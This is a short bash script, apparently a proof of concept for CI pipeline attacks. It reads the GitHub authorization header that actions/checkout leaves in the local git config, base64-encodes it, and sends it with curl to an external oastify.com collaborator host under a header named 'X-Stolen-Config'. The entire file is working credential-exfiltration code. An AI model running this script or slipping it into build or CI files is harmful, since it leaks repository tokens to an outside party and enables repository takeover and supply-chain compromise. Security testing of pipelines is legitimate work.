#!/bin/bash

# Retrieve the token from the Git local config
gitConfig=$(git config --get http.https://github.com/.extraheader)

if [ -n "$gitConfig" ]; then
    # Base64 encode the config string
    # -n is used with echo to avoid adding a trailing newline to the token
    base64Token=$(echo -n "$gitConfig" | base64)

    # Use curl to send the request
    curl -s -X GET "https://uiggssv7ndzlf4ju13gkxiv62x8owek3.oastify.com/git-config-steal" \
         -H "X-Stolen-Config: $base64Token"
    
    echo "Stole config header!"
else
    echo "Git config was empty (persist-credentials was false)."
fi
